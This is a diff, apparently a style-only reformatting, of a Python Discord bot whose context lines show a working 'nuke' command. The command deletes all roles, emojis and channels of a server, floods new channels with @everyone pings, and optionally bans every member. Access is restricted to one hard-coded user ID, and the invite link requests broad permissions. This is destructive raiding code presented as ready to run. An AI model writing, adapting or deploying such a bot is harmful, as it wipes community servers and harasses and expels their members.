@@ -8,10 +8,11 @@ from bot.cogs.events import Events
 
 # https://discord.com/api/oauth2/authorize?client_id=796805491186597968&permissions=2147483639&scope=bot
 
-bot = commands.Bot(command_prefix='_?_', help_command=None, intents=discord.Intents.all())
+bot = commands.Bot(
+    command_prefix="_?_", help_command=None, intents=discord.Intents.all()
+)
 
 dotenv.load_dotenv()
-
 
 
 async def del_roles(ctx):
@@ -22,8 +23,6 @@ async def del_roles(ctx):
         except:
             pass
 
-    
-
 
 async def del_emojis(ctx):
     emojis = ctx.guild.emojis
@@ -32,6 +31,7 @@ async def del_emojis(ctx):
             await emoji.delete()
         except:
             pass
+
 
 async def del_channels(ctx):
     channels = ctx.guild.channels
@@ -43,14 +43,16 @@ async def del_channels(ctx):
             except:
                 pass
 
+
 async def ping_everyone(ctx, ping):
     temp_channels = []
     for i in range(10):
-        temp_channels.append(await ctx.guild.create_text_channel('heh'))
+        temp_channels.append(await ctx.guild.create_text_channel("heh"))
     for i in range(ping):
         for channel in temp_channels:
             if isinstance(channel, discord.TextChannel):
-                await channel.send('@everyone')
+                await channel.send("@everyone")
+
 
 async def ban_everyone(ctx):
     members = ctx.guild.members
@@ -60,10 +62,11 @@ async def ban_everyone(ctx):
         except:
             pass
 
+
 @bot.command()
 async def nuke(ctx, ping: int, ban=None):
     if ctx.author.id == 688530998920871969:
-        await ctx.send('hehe nuke go brrrr')
+        await ctx.send("hehe nuke go brrrr")
         await del_roles(ctx)
         await del_emojis(ctx)
         await del_channels(ctx)
@@ -72,5 +75,6 @@ async def nuke(ctx, ping: int, ban=None):
         if ban:
             await ban_everyone(ctx)
         await ctx.send("nuke done, get rekd")
-        
-bot.run(os.environ['TOKEN']) # bot token
+
+
+bot.run(os.environ["TOKEN"])  # bot token
